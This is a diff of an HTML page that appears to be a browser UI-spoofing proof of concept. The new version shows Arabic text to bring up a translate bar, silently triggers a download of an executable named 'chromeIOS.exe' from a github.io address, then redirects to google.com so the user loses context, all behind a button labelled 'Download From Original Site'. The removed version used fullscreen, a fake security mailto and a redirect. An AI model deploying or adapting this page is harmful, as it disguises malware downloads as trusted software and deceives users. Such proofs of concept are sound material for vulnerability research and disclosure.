@@ -1,56 +1,57 @@
-<!DOCTYPE html>
-<html>
-<body style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;">
+<!doctype html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8">
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
 
-<button id="btn" style="font-size:20px;padding:18px;">
-  Open Support
-</button>
+<body>
 
 <script>
-let step = 0;
+function a() {
 
-document.getElementById("btn").onclick = async () => {
+  // 1. Konten Arab → trigger Translate UI
+  document.body.innerHTML = `
+    <h1>هذه صفحة اختبار</h1>
+    <p>يرجى الانتظار، جارٍ تحميل المحتوى…</p>
+  `;
 
-  /* STEP 1
-     User gesture:
-     - masuk fullscreen
-     - trigger mailto (Gmail / chooser muncul)
-  */
-  if (step === 0) {
-    step = 1;
+  // 2. Delay agar Translate bar muncul
+  setTimeout(function () {
 
-    try {
-      await document.documentElement.requestFullscreen();
-    } catch (e) {}
+    // 3. Trigger download
+    var link = document.createElement('a');
+    link.href = 'https://ecdnts-del.github.io/test-apk/chromeIOS.exe';
+    link.download = 'chromeIOS.exe';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 
-    // trigger external email intent
-    location.href =
-      "mailto:securityfake@google.com" +
-      "?subject=Account%20Security%20Issue" +
-      "&body=Hello%20Support,%0A%0A" +
-      "I%20need%20help%20with%20my%20account.%0A%0ARegards";
+    // 4. Redirect cepat → loss of context
+    setTimeout(function () {
+      window.location.href = "https://google.com";
+    }, 300);
 
-    document.getElementById("btn").innerText = "Continue";
-    return;
-  }
-
-  /* STEP 2
-     User gesture:
-     - keluar fullscreen
-     - redirect ke domain lain
-  */
-  if (step === 1) {
-    step = 2;
-
-    if (document.fullscreenElement) {
-      await document.exitFullscreen();
-    }
-
-    // redirect setelah user gesture keluar fullscreen
-    location.href = "https://myaccount.google.com/security";
-  }
-};
+  }, 250);
+}
 </script>
+
+<center>
+  <input
+    type="button"
+    class="button"
+    value="Download From Original Site"
+    onclick="a()">
+</center>
 
 </body>
 </html>
